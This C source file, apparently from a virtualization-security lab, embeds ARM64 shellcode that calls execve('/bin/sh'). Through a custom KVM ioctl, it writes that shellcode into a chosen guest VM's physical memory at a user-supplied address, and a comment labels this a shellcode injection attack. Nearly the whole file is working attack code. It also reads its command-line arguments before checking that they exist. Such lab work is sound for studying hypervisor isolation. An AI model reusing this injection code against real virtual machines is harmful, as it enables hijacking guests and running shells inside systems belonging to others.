#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <linux/kvm.h>

struct kvm_arm_write_gpa_args {
	uint32_t vmid;
	uint64_t gpa;
	uint64_t buf;
	uint64_t size;
};

#define KVM_ARM_WRITE_GPA _IOWR(KVMIO, 0x0b, struct kvm_arm_write_gpa_args)

extern void shellcode();
__asm__(".global _start_shellcode\n"
    ".global _end_shellcode\n"
    ".global shellcode\n"
	"shellcode:\n\t"
    "_start_shellcode:\n\t"
	/* push b'/bin///sh\x00' */
	/* Set x14 = 8299904519029482031 = 0x732f2f2f6e69622f */
	"mov  x14, #25135\n\t"
	"movk x14, #28265, lsl #16\n\t"
	"movk x14, #12079, lsl #0x20\n\t"
	"movk x14, #29487, lsl #0x30\n\t"
	"mov  x15, #104\n\t"
	"stp x14, x15, [sp, #-16]!\n\t"
	/* execve(path='sp', argv=0, envp=0) */
	"mov  x0, sp\n\t"
	"mov  x1, xzr\n\t"
	"mov  x2, xzr\n\t"
	/* call execve() */
	"mov  x8, #221\n\t" // SYS_execve
	"svc 0\n\t"
    "_end_shellcode:");

extern const char _start_shellcode;
extern const char _end_shellcode;

int main(int argc, char *argv[]) {
    uintptr_t start_address = (uintptr_t)&_start_shellcode;
    uintptr_t end_address = (uintptr_t)&_end_shellcode;
    size_t shellcode_size = end_address - start_address;
    printf("shellcode_size: %zu bytes\n", shellcode_size);

    struct kvm_arm_write_gpa_args wgpa = {
        .vmid = strtoul(argv[1], NULL, 0),
        .gpa = strtoull(argv[2], NULL, 16),
	.buf = (unsigned long)&shellcode,
        .size = shellcode_size,
    };
    // TODO: implement your shellcode injection attack

    if (argc < 3) {
	fprintf(stderr, "Usage: %s <vmid> <gpa>\n", argv[0]);
	exit(EXIT_FAILURE);
    }

    int kvm_fd = open("/dev/kvm", O_RDWR);
    if (kvm_fd < 0) {
        fprintf(stderr, "cannot open kvm device!\n");
        return 1;
    }

    int ret = ioctl(kvm_fd, KVM_ARM_WRITE_GPA, &wgpa);
    if (ret < 0) {
        fprintf(stderr, "cannot write gpa!\n");
        return 1;
    }

    close(kvm_fd);
    return 0;
}


